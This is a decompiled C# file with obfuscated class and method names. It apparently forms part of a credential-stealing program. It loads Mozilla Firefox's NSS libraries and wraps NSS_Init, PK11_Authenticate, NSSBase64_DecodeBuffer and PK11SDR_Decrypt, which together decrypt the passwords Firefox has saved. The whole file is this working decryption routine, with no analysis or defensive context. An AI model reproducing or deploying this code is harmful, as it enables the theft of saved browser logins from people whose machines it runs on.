using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class7
{
	public sealed class Class8
	{
		public static long long_0;

		public static byte[] byte_0;
	}

	public struct Struct2
	{
		public int int_0;

		public int int_1;

		public int int_2;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate0(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate1();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate2(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate3(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate4(ref Struct2 data, ref Struct2 result, int cx);

	private static IntPtr intptr_0;

	public static string string_0;

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string string_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_1, string string_1);

	public static long smethod_0(string string_1)
	{
		string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		LoadLibrary(text + "mozcrt19.dll");
		LoadLibrary(text + "nspr4.dll");
		LoadLibrary(text + "plc4.dll");
		LoadLibrary(text + "plds4.dll");
		LoadLibrary(text + "ssutil3.dll");
		LoadLibrary(text + "sqlite3.dll");
		LoadLibrary(text + "nssutil3.dll");
		LoadLibrary(text + "softokn3.dll");
		intptr_0 = LoadLibrary(text + "nss3.dll");
		IntPtr procAddress = GetProcAddress(intptr_0, "NSS_Init");
		Delegate0 @delegate = (Delegate0)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate0));
		return @delegate(string_1);
	}

	public static long smethod_1()
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "PK11_GetInternalKeySlot");
		Delegate1 @delegate = (Delegate1)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate1));
		return @delegate();
	}

	public static long smethod_2(long long_0, bool bool_0, long long_1)
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "PK11_Authenticate");
		Delegate2 @delegate = (Delegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate2));
		return @delegate(long_0, bool_0, long_1);
	}

	public static int smethod_3(IntPtr intptr_1, IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0)
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "NSSBase64_DecodeBuffer");
		Delegate3 @delegate = (Delegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate3));
		return @delegate(intptr_1, intptr_2, stringBuilder_0, int_0);
	}

	public static int smethod_4(ref Struct2 struct2_0, ref Struct2 struct2_1, int int_0)
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "PK11SDR_Decrypt");
		Delegate4 @delegate = (Delegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate4));
		return @delegate(ref struct2_0, ref struct2_1, int_0);
	}
}
